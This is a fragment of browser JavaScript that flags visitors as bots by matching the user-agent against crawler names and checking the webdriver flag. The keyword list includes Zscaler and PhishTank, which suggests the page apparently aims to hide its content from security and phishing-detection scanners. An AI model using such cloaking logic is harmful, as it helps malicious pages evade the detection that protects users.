        var ua = (navigator.userAgent || '').toLowerCase();
        var botKeywords = [
          'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
          'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',

          'httpclient', 'go-http-client', 'postman', 'zscaler', 'phishtank'
        ];
        var isBotUA = botKeywords.some(function(k) { return ua.indexOf(k) !== -1; });
        var isWebdriver = !!navigator.webdriver;
        if (isBotUA || isWebdriver) {
          window.__IS_BOT_DETECTED__ = true;
        }
      })();
